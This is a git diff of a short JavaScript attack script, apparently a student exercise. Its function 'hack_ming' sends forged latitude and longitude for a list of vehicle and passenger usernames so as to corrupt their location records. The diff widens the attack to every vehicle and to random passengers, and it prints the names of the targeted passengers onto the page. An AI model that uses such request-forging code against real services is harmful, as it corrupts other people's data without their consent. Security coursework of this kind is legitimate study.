@@ -2,15 +2,20 @@
  * Sends forged lat and lng to compromize users' data
  */
 function hack_ming(){
-	for (i = 0; i < 3; i++){
-		randnr = Math.floor((Math.random() * 83));
+
+	for (i = 0; i < vehicles.length; i++){
 		send_req(vehicles[i]);
-		//send_req(passengers[randnr]);
+	}
+
+	for (i = 0; i < 4; i++){
+		randnr = Math.floor((Math.random() * 83));
+		document.getElementById('hacked').innerHTML += "<p>" + passengers[randnr] + "</p>";
+		send_req(passengers[randnr]);
 	}
 }
 
 /*
- * Compromises all vehicles' data and a random list of 3 passengers' data.
+ * Compromises all vehicles' data and a random list of 4 passengers' data.
  */
 function send_req(username){
 	request = new XMLHttpRequest();
@@ -18,20 +23,16 @@ function send_req(username){
     request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
     request.onreadystatechange = function() {
-            if (request.readyState == 4 && request.status == 200){
+            if (request.readyState == 3 && request.status == 200){
                 var response = request.responseText;
                 var responseObject = JSON.parse(response);
-
-                console.log(request.responseText);
-
             }
     };
-   	var params = "username=" + username + "&lat=13&lng=1";
+   	var params = "username=" + username + "&lat=13&lng=13";
     request.send(params);
 }
 
-vehicles = 
-["aSOqNo4S", "cQRzspF5", "itShXf78", "w8XMS577", "wtDRzig8", "ym2J1vil", "4aTtB30R", "1fH5MXna"];
+vehicles = ["JANET", "aSOqNo4S", "cQRzspF5", "itShXf78", "w8XMS577", "wtDRzig8", "ym2J1vil", "4aTtB30R", "1fH5MXna"];
 
 
 passengers = 
